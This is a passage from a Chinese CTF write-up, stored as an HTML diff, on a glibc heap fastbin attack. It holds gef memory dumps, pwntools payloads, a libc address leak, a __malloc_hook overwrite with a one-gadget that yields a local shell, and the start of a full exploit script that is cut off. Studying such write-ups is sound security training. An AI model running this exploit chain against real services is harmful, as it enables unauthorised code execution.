+Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x555555757050, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757030, size=0x20, flags=PREV_INUSE)
+gef➤  x/40gx 0x0000555555757010-0x10
+0x555555757000: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 0
+0x555555757010: 0x4141414141414141  0x4141414141414141
+0x555555757020: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 1 [be freed]
+0x555555757030: 0x0000000000000000  0x4141414141414141
+0x555555757040: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 2 [be freed]  &lt;-- fast bins
+0x555555757050: 0x0000555555757020  0x4141414141414141      &lt;-- fd pointer
+0x555555757060: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 3
+0x555555757070: 0x4141414141414141  0x4141414141414141
+0x555555757080: 0x0000000000000000  0x0000000000000091  &lt;-- chunk 4
+0x555555757090: 0x4141414141414141  0x4141414141414141
+0x5555557570a0: 0x4141414141414141  0x4141414141414141
+0x5555557570b0: 0x4141414141414141  0x4141414141414141
+0x5555557570c0: 0x4141414141414141  0x4141414141414141
+0x5555557570d0: 0x4141414141414141  0x4141414141414141
+0x5555557570e0: 0x4141414141414141  0x4141414141414141
+0x5555557570f0: 0x4141414141414141  0x4141414141414141
+0x555555757100: 0x4141414141414141  0x4141414141414141
+0x555555757110: 0x0000000000000000  0x0000000000020ef1
+0x555555757120: 0x0000000000000000  0x0000000000000000
+0x555555757130: 0x0000000000000000  0x0000000000000000
+gef➤  x/20gx 0xafc966564d0-0x10
+0xafc966564c0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 0 -&gt; chunk 0
+0xafc966564d0:  0x0000555555757010  0x0000000000000000
+0xafc966564e0:  0x0000000000000000  0x0000000000000000
+0xafc966564f0:  0x0000000000000000  0x0000000000000000
+0xafc96656500:  0x0000000000000000  0x0000000000000001  &lt;-- idx 3 -&gt; chunk 3
+0xafc96656510:  0x0000000000000010  0x0000555555757070
+0xafc96656520:  0x0000000000000001  0x0000000000000080  &lt;-- idx 4 -&gt; chunk 4
+0xafc96656530:  0x0000555555757090  0x0000000000000000
+0xafc96656540:  0x0000000000000000  0x0000000000000000
+0xafc96656550:  0x0000000000000000  0x0000000000000000
+</pre></div>
+free 掉的 chunk，其结构体被清空，等待下一次 malloc，并添加到空出来的地方。</p>
+<p>通过溢出漏洞修改已被释放的 chunk 2，让 fd 指针指向 chunk 4，这样就将 small chunk 加入到了 fastbins 链表中，然后还需要把 chunk 4 的 0x91 改成 0x21 以绕过 fastbins 大小的检查：
+<div class="codehilite"><pre><span></span><span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>gef➤  x/2gx &amp;main_arena
+0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000  0x0000555555757040
+gef➤  heap bins fast
+[ Fastbins for arena 0x7ffff7dd1b20 ]
+Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x555555757050, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757090, size=0x20, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x4141414141414151]
+gef➤  x/40gx 0x0000555555757010-0x10
+0x555555757000: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 0
+0x555555757010: 0x4141414141414141  0x4141414141414141
+0x555555757020: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 1 [be freed]
+0x555555757030: 0x0000000000000000  0x4141414141414141
+0x555555757040: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 2 [be freed]  &lt;-- fast bins
+0x555555757050: 0x0000555555757080  0x4141414141414141      &lt;-- fd pointer
+0x555555757060: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 3
+0x555555757070: 0x4141414141414141  0x4141414141414141
+0x555555757080: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 4
+0x555555757090: 0x4141414141414141  0x4141414141414141
+0x5555557570a0: 0x4141414141414141  0x4141414141414141
+0x5555557570b0: 0x4141414141414141  0x4141414141414141
+0x5555557570c0: 0x4141414141414141  0x4141414141414141
+0x5555557570d0: 0x4141414141414141  0x4141414141414141
+0x5555557570e0: 0x4141414141414141  0x4141414141414141
+0x5555557570f0: 0x4141414141414141  0x4141414141414141
+0x555555757100: 0x4141414141414141  0x4141414141414141
+0x555555757110: 0x0000000000000000  0x0000000000020ef1
+0x555555757120: 0x0000000000000000  0x0000000000000000
+0x555555757130: 0x0000000000000000  0x0000000000000000
+</pre></div></p>
+<p>现在我们再分配两个 chunk，它们都会从 fastbins 中被取出来，而且 new chunk 2 会和原来的 chunk 4 起始位置重叠，但前者是 fast chunk，而后者是 small chunk，即一个大 chunk 里包含了一个小 chunk，这正是我们需要的：
+<div class="codehilite"><pre><span></span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&quot;D&quot;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>gef➤  x/2gx &amp;main_arena
+0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000  0x4141414141414141
+gef➤  x/40gx 0x0000555555757010-0x10
+0x555555757000: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 0
+0x555555757010: 0x4141414141414141  0x4141414141414141
+0x555555757020: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 1 [be freed]
+0x555555757030: 0x0000000000000000  0x4141414141414141
+0x555555757040: 0x0000000000000000  0x0000000000000021  &lt;-- new chunk 1
+0x555555757050: 0x4242424242424242  0x4242424242424242
+0x555555757060: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 3
+0x555555757070: 0x4141414141414141  0x4141414141414141
+0x555555757080: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 4, new chunk 2
+0x555555757090: 0x4444444444444444  0x4444444444444444
+0x5555557570a0: 0x0000000000000000  0x4141414141414141
+0x5555557570b0: 0x4141414141414141  0x4141414141414141
+0x5555557570c0: 0x4141414141414141  0x4141414141414141
+0x5555557570d0: 0x4141414141414141  0x4141414141414141
+0x5555557570e0: 0x4141414141414141  0x4141414141414141
+0x5555557570f0: 0x4141414141414141  0x4141414141414141
+0x555555757100: 0x4141414141414141  0x4141414141414141
+0x555555757110: 0x0000000000000000  0x0000000000020ef1
+0x555555757120: 0x0000000000000000  0x0000000000000000
+0x555555757130: 0x0000000000000000  0x0000000000000000
+gef➤  x/20gx 0xafc966564d0-0x10
+0xafc966564c0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 0 -&gt; chunk 0
+0xafc966564d0:  0x0000555555757010  0x0000000000000001  &lt;-- idx 1 -&gt; new chunk 1
+0xafc966564e0:  0x0000000000000010  0x0000555555757050
+0xafc966564f0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 2 -&gt; new chunk 2
+0xafc96656500:  0x0000555555757090  0x0000000000000001  &lt;-- idx 3 -&gt; chunk 3
+0xafc96656510:  0x0000000000000010  0x0000555555757070
+0xafc96656520:  0x0000000000000001  0x0000000000000080  &lt;-- idx 4 -&gt; chunk 4
+0xafc96656530:  0x0000555555757090  0x0000000000000000
+0xafc96656540:  0x0000000000000000  0x0000000000000000
+0xafc96656550:  0x0000000000000000  0x0000000000000000
+</pre></div>
+可以看到新分配的 chunk 2，填补到了被释放的 chunk 2 的位置上。</p>
+<p>再次利用溢出漏洞将 chunk 4 的 0x21 改回 0x91，然后为了避免 free(4) 后该 chunk 被合并进 top chunk，需要再分配一个 small chunk：
+<div class="codehilite"><pre><span></span><span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">128</span><span class="p">)</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>gef➤  x/60gx 0x0000555555757010-0x10
+0x555555757000: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 0
+0x555555757010: 0x4141414141414141  0x4141414141414141
+0x555555757020: 0x0000000000000000  0x0000000000000021
+0x555555757030: 0x0000000000000000  0x4141414141414141
+0x555555757040: 0x0000000000000000  0x0000000000000021  &lt;-- new chunk 1
+0x555555757050: 0x4242424242424242  0x4242424242424242
+0x555555757060: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 3
+0x555555757070: 0x4141414141414141  0x4141414141414141
+0x555555757080: 0x0000000000000000  0x0000000000000091  &lt;-- chunk 4, new chunk 2
+0x555555757090: 0x4444444444444444  0x4444444444444444
+0x5555557570a0: 0x0000000000000000  0x4141414141414141
+0x5555557570b0: 0x4141414141414141  0x4141414141414141
+0x5555557570c0: 0x4141414141414141  0x4141414141414141
+0x5555557570d0: 0x4141414141414141  0x4141414141414141
+0x5555557570e0: 0x4141414141414141  0x4141414141414141
+0x5555557570f0: 0x4141414141414141  0x4141414141414141
+0x555555757100: 0x4141414141414141  0x4141414141414141
+0x555555757110: 0x0000000000000000  0x0000000000000091  &lt;-- chunk 5
+0x555555757120: 0x4141414141414141  0x4141414141414141
+0x555555757130: 0x4141414141414141  0x4141414141414141
+0x555555757140: 0x4141414141414141  0x4141414141414141
+0x555555757150: 0x4141414141414141  0x4141414141414141
+0x555555757160: 0x4141414141414141  0x4141414141414141
+0x555555757170: 0x4141414141414141  0x4141414141414141
+0x555555757180: 0x4141414141414141  0x4141414141414141
+0x555555757190: 0x4141414141414141  0x4141414141414141
+0x5555557571a0: 0x0000000000000000  0x0000000000020e61  &lt;-- top chunk
+0x5555557571b0: 0x0000000000000000  0x0000000000000000
+0x5555557571c0: 0x0000000000000000  0x0000000000000000
+0x5555557571d0: 0x0000000000000000  0x0000000000000000
+gef➤  x/20gx 0xafc966564d0-0x10
+0xafc966564c0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 0 -&gt; chunk 0
+0xafc966564d0:  0x0000555555757010  0x0000000000000001  &lt;-- idx 1 -&gt; new chunk 1
+0xafc966564e0:  0x0000000000000010  0x0000555555757050
+0xafc966564f0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 2 -&gt; new chunk 2
+0xafc96656500:  0x0000555555757090  0x0000000000000001  &lt;-- idx 3 -&gt; chunk 3
+0xafc96656510:  0x0000000000000010  0x0000555555757070
+0xafc96656520:  0x0000000000000001  0x0000000000000080  &lt;-- idx 4 -&gt; chunk 4
+0xafc96656530:  0x0000555555757090  0x0000000000000001  &lt;-- idx 5 -&gt; chunk 5
+0xafc96656540:  0x0000000000000080  0x0000555555757120
+0xafc96656550:  0x0000000000000000  0x0000000000000000
+</pre></div></p>
+<p>这时，如果我们将 chunk 4 释放掉，其 fd 指针会被设置为指向 unsorted bin 链表的头部，这个地址在 libc 中，且相对位置固定，利用它就可以算出 libc 被加载的地址：
+<div class="codehilite"><pre><span></span><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>gef➤  heap bins unsorted
+[ Unsorted Bin for arena &#39;main_arena&#39; ]
+[+] unsorted_bins[0]: fw=0x555555757080, bk=0x555555757080
+ →   Chunk(addr=0x555555757090, size=0x90, flags=PREV_INUSE)
+gef➤  x/60gx 0x0000555555757010-0x10
+0x555555757000: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 0
+0x555555757010: 0x4141414141414141  0x4141414141414141
+0x555555757020: 0x0000000000000000  0x0000000000000021
+0x555555757030: 0x0000000000000000  0x4141414141414141
+0x555555757040: 0x0000000000000000  0x0000000000000021  &lt;-- new chunk 1
+0x555555757050: 0x4242424242424242  0x4242424242424242
+0x555555757060: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 3
+0x555555757070: 0x4141414141414141  0x4141414141414141
+0x555555757080: 0x0000000000000000  0x0000000000000091  &lt;-- chunk 4 [be freed], new chunk 2 &lt;-- unsorted bin
+0x555555757090: 0x00007ffff7dd1b78  0x00007ffff7dd1b78      &lt;-- fd, bk pointer
+0x5555557570a0: 0x0000000000000000  0x4141414141414141
+0x5555557570b0: 0x4141414141414141  0x4141414141414141
+0x5555557570c0: 0x4141414141414141  0x4141414141414141
+0x5555557570d0: 0x4141414141414141  0x4141414141414141
+0x5555557570e0: 0x4141414141414141  0x4141414141414141
+0x5555557570f0: 0x4141414141414141  0x4141414141414141
+0x555555757100: 0x4141414141414141  0x4141414141414141
+0x555555757110: 0x0000000000000090  0x0000000000000090  &lt;-- chunk 5
+0x555555757120: 0x4141414141414141  0x4141414141414141
+0x555555757130: 0x4141414141414141  0x4141414141414141
+0x555555757140: 0x4141414141414141  0x4141414141414141
+0x555555757150: 0x4141414141414141  0x4141414141414141
+0x555555757160: 0x4141414141414141  0x4141414141414141
+0x555555757170: 0x4141414141414141  0x4141414141414141
+0x555555757180: 0x4141414141414141  0x4141414141414141
+0x555555757190: 0x4141414141414141  0x4141414141414141
+0x5555557571a0: 0x0000000000000000  0x0000000000020e61
+0x5555557571b0: 0x0000000000000000  0x0000000000000000
+0x5555557571c0: 0x0000000000000000  0x0000000000000000
+0x5555557571d0: 0x0000000000000000  0x0000000000000000
+gef➤  x/20gx 0xafc966564d0-0x10
+0xafc966564c0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 0 -&gt; chunk 0
+0xafc966564d0:  0x0000555555757010  0x0000000000000001  &lt;-- idx 1 -&gt; new chunk 1
+0xafc966564e0:  0x0000000000000010  0x0000555555757050
+0xafc966564f0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 2 -&gt; new chunk 2
+0xafc96656500:  0x0000555555757090  0x0000000000000001  &lt;-- idx 3 -&gt; chunk 3
+0xafc96656510:  0x0000000000000010  0x0000555555757070
+0xafc96656520:  0x0000000000000000  0x0000000000000000
+0xafc96656530:  0x0000000000000000  0x0000000000000001  &lt;-- idx 5 -&gt; chunk 5
+0xafc96656540:  0x0000000000000080  0x0000555555757120
+0xafc96656550:  0x0000000000000000  0x0000000000000000
+</pre></div></p>
+<p>最后利用 Dump 操作即可将地址泄漏出来：
+<div class="codehilite"><pre><span></span><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">dump</span><span class="p">(</span><span class="mi">2</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>          <span class="c1"># 0x3c4b78 = leak - libc</span>
+<span class="n">__malloc_hook</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">-</span> <span class="mh">0x3c4b10</span>    <span class="c1"># readelf -s libc.so.6 | grep __malloc_hook@</span>
+<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">-</span> <span class="mh">0x4526a</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>[*] leak =&gt; 0x7ffff7dd1b78
+[*] libc =&gt; 0x7ffff7a0d000
+[*] __malloc_hook =&gt; 0x7ffff7dd1b10
+[*] one_gadget =&gt; 0x7ffff7a5226a
+</pre></div></p>
+<h4 id="get-shell">get shell<a class="headerlink" href="#get-shell" title="Permanent link">&para;</a></h4>
+<p>由于开启了 Full RELRO，改写 GOT 表是不行了。考虑用 <code>__malloc_hook</code>，它是一个弱类型的函数指针变量，指向 <code>void * function(size_t size, void * caller)</code>，当调用 malloc() 时，首先判断 hook 函数指针是否为空，不为空则调用它。所以这里我们传入一个 one-gadget 即可（详情请查看章节4.6）。</p>
+<p>首先考虑怎样利用 fastbins 在 <code>__malloc_hook</code> 指向的地址处写入 one_gadget 的地址。这里有一个技巧，地址偏移，就像下面这样构造一个 fake chunk，其大小为 0x7f，也就是一个 fast chunk：
+<div class="codehilite"><pre><span></span>gef➤  x/10gx (long long)(&amp;main_arena)-0x30
+0x7ffff7dd1af0 &lt;_IO_wide_data_0+304&gt;:   0x00007ffff7dd0260  0x0000000000000000
+0x7ffff7dd1b00 &lt;__memalign_hook&gt;:   0x00007ffff7a92e20  0x00007ffff7a92a00
+0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000  0x4141414141414141  &lt;-- target
+0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000
+gef➤  x/10gx (long long)(&amp;main_arena)-0x30+0xd
+0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f      &lt;-- fake chunk
+0x7ffff7dd1b0d: 0x000000000000007f  0x0000000000000000
+0x7ffff7dd1b1d: 0x0000000000000000  0x4141414141000000
+0x7ffff7dd1b2d: 0x0000000000414141  0x0000000000000000
+0x7ffff7dd1b3d: 0x0000000000000000  0x0000000000000000
+</pre></div>
+用本地的泄露地址减去 libc 地址得到偏移：
+<div class="codehilite"><pre><span></span>[0x00000000]&gt; ?v 0x7ffff7dd1b78 - 0x7ffff7a0d000
+0x3c4b78
+</pre></div></p>
+<p>之前 free 掉的 chunk 4 一个 small chunk，被添加到了 unsorted bin 中，而这里我们需要的是 fast chunk，所以这里采用分配一个 fast chunk，再释放掉的办法，将其添加到 fast bins 中。然后改写它的 fd 指针指向 fake chunk（当然也要通过 libc 偏移计算出来）：
+<div class="codehilite"><pre><span></span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3c4afd</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>gef➤  heap bins unsorted
+[ Unsorted Bin for arena &#39;main_arena&#39; ]
+[+] unsorted_bins[0]: fw=0x5555557570f0, bk=0x5555557570f0
+ →   Chunk(addr=0x555555757100, size=0x20, flags=PREV_INUSE)
+gef➤  x/60gx 0x0000555555757010-0x10
+0x555555757000: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 0
+0x555555757010: 0x4141414141414141  0x4141414141414141
+0x555555757020: 0x0000000000000000  0x0000000000000021
+0x555555757030: 0x0000000000000000  0x4141414141414141
+0x555555757040: 0x0000000000000000  0x0000000000000021  &lt;-- new chunk 1
+0x555555757050: 0x4242424242424242  0x4242424242424242
+0x555555757060: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 3
+0x555555757070: 0x4141414141414141  0x4141414141414141
+0x555555757080: 0x0000000000000000  0x0000000000000071  &lt;-- new chunk 2, new chunk 4 [be freed]
+0x555555757090: 0x00007ffff7dd1afd  0x0000000000000000      &lt;-- fd pointer
+0x5555557570a0: 0x0000000000000000  0x0000000000000000
+0x5555557570b0: 0x0000000000000000  0x0000000000000000
+0x5555557570c0: 0x0000000000000000  0x0000000000000000
+0x5555557570d0: 0x0000000000000000  0x0000000000000000
+0x5555557570e0: 0x0000000000000000  0x0000000000000000
+0x5555557570f0: 0x0000000000000000  0x0000000000000021      &lt;-- unsorted bin
+0x555555757100: 0x00007ffff7dd1b78  0x00007ffff7dd1b78
+0x555555757110: 0x0000000000000020  0x0000000000000090  &lt;-- chunk 5
+0x555555757120: 0x4141414141414141  0x4141414141414141
+0x555555757130: 0x4141414141414141  0x4141414141414141
+0x555555757140: 0x4141414141414141  0x4141414141414141
+0x555555757150: 0x4141414141414141  0x4141414141414141
+0x555555757160: 0x4141414141414141  0x4141414141414141
+0x555555757170: 0x4141414141414141  0x4141414141414141
+0x555555757180: 0x4141414141414141  0x4141414141414141
+0x555555757190: 0x4141414141414141  0x4141414141414141
+0x5555557571a0: 0x0000000000000000  0x0000000000020e61
+0x5555557571b0: 0x0000000000000000  0x0000000000000000
+0x5555557571c0: 0x0000000000000000  0x0000000000000000
+0x5555557571d0: 0x0000000000000000  0x0000000000000000
+</pre></div></p>
+<p>连续两次分配，第一次将 fake chunk 添加到 fast bins，第二次分配 fake chunk，分别是 new new chunk 4 和 chunk 6。然后就可以改写 <code>__malloc_hook</code> 的地址，将其指向 one-gadget：
+<div class="codehilite"><pre><span></span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>gef➤  x/10gx (long long)(&amp;main_arena)-0x30
+0x7ffff7dd1af0 &lt;_IO_wide_data_0+304&gt;:   0x00007ffff7dd0260  0x0000000000000000
+0x7ffff7dd1b00 &lt;__memalign_hook&gt;:   0x00007ffff7a92e20  0x000000fff7a92a00
+0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x00007ffff7a5226a  0x0000000000000000  &lt;-- target
+0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000  0x4141414141414141
+0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000
+gef➤  x/60gx 0x0000555555757010-0x10
+0x555555757000: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 0
+0x555555757010: 0x4141414141414141  0x4141414141414141
+0x555555757020: 0x0000000000000000  0x0000000000000021
+0x555555757030: 0x0000000000000000  0x4141414141414141
+0x555555757040: 0x0000000000000000  0x0000000000000021  &lt;-- new chunk 1
+0x555555757050: 0x4242424242424242  0x4242424242424242
+0x555555757060: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 3
+0x555555757070: 0x4141414141414141  0x4141414141414141
+0x555555757080: 0x0000000000000000  0x0000000000000071  &lt;-- new chunk 2, new new chunk 4
+0x555555757090: 0x0000000000000000  0x0000000000000000
+0x5555557570a0: 0x0000000000000000  0x0000000000000000
+0x5555557570b0: 0x0000000000000000  0x0000000000000000
+0x5555557570c0: 0x0000000000000000  0x0000000000000000
+0x5555557570d0: 0x0000000000000000  0x0000000000000000
+0x5555557570e0: 0x0000000000000000  0x0000000000000000
+0x5555557570f0: 0x0000000000000000  0x0000000000000021      &lt;-- unsorted bin
+0x555555757100: 0x00007ffff7dd1b78  0x00007ffff7dd1b78
+0x555555757110: 0x0000000000000020  0x0000000000000090  &lt;-- chunk 5
+0x555555757120: 0x4141414141414141  0x4141414141414141
+0x555555757130: 0x4141414141414141  0x4141414141414141
+0x555555757140: 0x4141414141414141  0x4141414141414141
+0x555555757150: 0x4141414141414141  0x4141414141414141
+0x555555757160: 0x4141414141414141  0x4141414141414141
+0x555555757170: 0x4141414141414141  0x4141414141414141
+0x555555757180: 0x4141414141414141  0x4141414141414141
+0x555555757190: 0x4141414141414141  0x4141414141414141
+0x5555557571a0: 0x0000000000000000  0x0000000000020e61
+0x5555557571b0: 0x0000000000000000  0x0000000000000000
+0x5555557571c0: 0x0000000000000000  0x0000000000000000
+0x5555557571d0: 0x0000000000000000  0x0000000000000000
+gef➤  x/30gx 0xafc966564d0-0x10
+0xafc966564c0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 0 -&gt; chunk 0
+0xafc966564d0:  0x0000555555757010  0x0000000000000001  &lt;-- idx 1 -&gt; new chunk 1
+0xafc966564e0:  0x0000000000000010  0x0000555555757050
+0xafc966564f0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 2 -&gt; new chunk 2
+0xafc96656500:  0x0000555555757090  0x0000000000000001  &lt;-- idx 3 -&gt; chunk 3
+0xafc96656510:  0x0000000000000010  0x0000555555757070
+0xafc96656520:  0x0000000000000001  0x0000000000000060  &lt;-- idx 4 -&gt; new new chunk4
+0xafc96656530:  0x0000555555757090  0x0000000000000001  &lt;-- idx 5 -&gt; chunk 5
+0xafc96656540:  0x0000000000000080  0x0000555555757120
+0xafc96656550:  0x0000000000000001  0x0000000000000060  &lt;-- idx 6 -&gt; chunk 6
+0xafc96656560:  0x00007ffff7dd1b0d  0x0000000000000000
+0xafc96656570:  0x0000000000000000  0x0000000000000000
+0xafc96656580:  0x0000000000000000  0x0000000000000000
+0xafc96656590:  0x0000000000000000  0x0000000000000000
+0xafc966565a0:  0x0000000000000000  0x0000000000000000
+</pre></div></p>
+<p>最后，只要调用了 malloc，就会触发 hook 函数，即 one-gadget。现在可以开启 ASLR 了，因为通过泄漏 libc 地址，我们已经完全绕过了它。</p>
+<p>Bingo!!!
+<div class="codehilite"><pre><span></span>$ python exp.py
+[+] Opening connection to 127.0.0.1 on port 10001: Done
+[*] leak =&gt; 0x7f8c1be9eb78
+[*] libc =&gt; 0x7f8c1bada000
+[*] __malloc_hook =&gt; 0x7f8c1be9eb10
+[*] one_gadget =&gt; 0x7f8c1bb1f26a
+[*] Switching to interactive mode
+$ whoami
+firmy
+</pre></div></p>
+<p>本题多次使用 fastbin attack，确实经典。</p>
+<h4 id="exploit">exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h4>
+<p>完整的 exp 如下：
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">fill</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">cont</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
